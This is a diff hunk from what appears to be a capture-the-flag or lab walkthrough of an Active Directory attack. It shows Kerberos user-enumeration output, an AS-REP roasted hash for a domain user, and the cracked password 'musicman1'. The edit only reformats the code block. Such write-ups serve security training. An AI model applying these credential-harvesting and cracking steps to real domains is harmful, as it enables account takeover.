@@ -80,8 +80,8 @@ $krb5asrep$18$jack.dowland@SYSCO.LOCAL:fc0fa99a1a1e18d3c10f3a404d5217c7$f8a71edb
 2025/10/31 16:29:40 >  Done! Tested 58 usernames (3 valid) in 6.422 seconds
 ```
 ### Crack the Hash Using hashcat
-```language
-$krb5asrep$18$jack.dowland@SYSCO.LOCAL:fc0fa99a1a1e18d3c10f3a404d5217c7$f8a71edb135b8f43875b06923ff4c7166cf3b2d95ca7b7e781b275e076dc1541a0a1f1eeeb2302911b80f3b31bcd9e9ed5fcfaf98c31c64443bbfcc3f38521960d5ad30a5f5a69434dc63bdd0cbdf5baa12e11f07e88c52590b23e5ffe3ef3933d0c52469b5fcad47ef945c9b73ed39a5938d2e5a18852357e00efda6801677e4866027cf6ed0970f343a8cea5889fe7dc0c96f9d1cac0f1ad99cb603b84cd55ec30c68452c7ec76e625f52dc43a76e00f27013dbdbba3faad8746297edfa2c2de3da5191a782405b86d77a59e02582865cd3c0da4cc93ba6ac96f03eaaad1f191e7e8c305a794aeba7e793c09b8e91384e6f86e3ab71c1ccb4c49393b97:musicman1
+```markdown
+$krb5asrep$18$jack.dowland@SYSCO.LOCAL:fc0fa99a1a1e18d3c10f3a404d5217c7$f8a71edb135b8f43875b06923ff4c7166cf3b2d95ca7b7e781b275e076dc1541a0a1f1eeeb2302911b80f3b31bcd9e9ed5fcfaf98c31c64443bbfcc3f38521960d5ad30a5f5a69434dc63bdd0cbdf5baa12e11f07e88c52590b23e5ffe3ef3933d0c52469b5fcad47ef945c9b73ed39a5938d2e5a18852357e00efda6801677e4866027cf6ed0970f343a8cea5889fe7dc0c96f9d1cac0f1ad99cb603b84cd55ec30c68452c7ec76e625f52dc43a76e00f27013dbdbba3faad8746297edfa2c2de3da5191a782405b86d77a59e02582865cd3c0da4cc93ba6ac96f03eaaad1f191e7e8c305a794aeba7e793c09b8e91384e6f86e3ab71c1ccb4c49393b97:`musicman1`
 ```
 Validate the Creds
 ```language                                                                                                                                                                                             
